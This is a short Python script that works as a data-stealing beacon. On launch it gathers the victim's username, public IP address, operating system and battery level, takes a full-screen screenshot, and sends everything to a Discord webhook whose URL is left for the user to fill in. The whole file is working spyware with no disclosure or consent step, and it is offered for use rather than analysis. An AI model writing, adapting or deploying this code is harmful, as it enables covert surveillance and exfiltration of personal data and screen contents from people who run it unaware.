import requests
import subprocess
import getpass
import platform
import psutil
from PIL import ImageGrab
import os

username = getpass.getuser()
webhook = "YOUR-WEBHOOK-URL"

def get_battery_percent():
    battery = psutil.sensors_battery()
    if battery is not None:
        return battery.percent
    else:
        return None

def get_ip():
    try:
        response = requests.get('https://api.ipify.org/?format=json')
        ip_data = response.json()
        return ip_data['ip']
    except requests.RequestException:
        return None

def get_os():
    system = platform.system()
    release = platform.release()
    return f"{system} {release}"

oses = get_os()

ip = get_ip()
if ip:
    userip = ip
else:
    userip = "Failed to get IP."

battery_percent = get_battery_percent()
if battery_percent is not None:
    charge = battery_percent
else:
    charge = "Failed to get battery."

message3 = f"# New launch!\nUsername: {username}\nIP: {userip}\nOS: {oses}\nBattery: {charge}%\nScreenshot:"

def send_discord_message(webhook_url, message):
    payload = {
        "content": message
    }
    response = requests.post(webhook_url, json=payload)

def sendimage(webhook_url, path):
    image = ImageGrab.grab()
    image.save(path)
    with open(path, "rb") as file:
        files = {"image": file}
        response = requests.post(webhook_url, files=files)

send_discord_message(webhook, message3)
sendimage(webhook, f"C:/Users/{username}/AppData/Local/image.png")
